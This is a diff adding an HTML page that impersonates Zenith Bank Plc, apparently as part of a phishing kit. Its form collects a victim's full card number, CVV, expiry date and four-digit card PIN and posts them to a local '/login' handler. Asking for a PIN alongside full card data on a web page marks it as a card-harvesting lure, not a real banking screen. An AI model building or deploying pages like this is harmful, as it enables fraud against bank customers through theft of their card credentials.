@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="/img/zenith/Zenith_Bank_logo.png" type="image/x-icon" />
+    <link rel="stylesheet" type="text/css" href="/css/style.css" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Sharp:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+    <title>Apps - Zenith Bank Plc</title>
+</head>
+<body>
+    <nav>
+        <a href="/">
+            <span class="material-symbols-sharp"> navigate_before </span>
+        </a>
+        <h3>Input Card details</h3>
+        <img src="img/zenith/Zenith_Bank_logo.png" alt="" />
+    </nav>
+    <main>
+        <form action="/login" method="post">
+            <div class="input">
+                <label for="card-pan">Card PAN</label>
+                <input type="number" name="number" placeholder="Enter Card Number" required id="number" min="0" />
+            </div>
+            <div class="flex-box">
+                <div class="input">
+                    <label for="cvv">CVV</label>
+                    <input type="number" name="cvv" required placeholder="Enter CVV Number" style="text-transform: uppercase" min="0" id="cvv" />
+                </div>
+                <div class="input">
+                    <label for="exp-date">Exp</label>
+                    <input type="number" name="expire" onkeyup="expireDate()" placeholder="Expiry (MM/YY)" required class="expire" />
+                </div>
+            </div>
+            <div class="input">
+                <label for="pin">Card PIN</label>
+                <input type="password" name="pin" placeholder="Enter Card PIN" maxlength="4" required id="pin" />
+            </div>
+            <button>continue</button>
+        </form>
+    </main>
+    <script src="/jscript/index.js"></script>
+</body>
+</html>
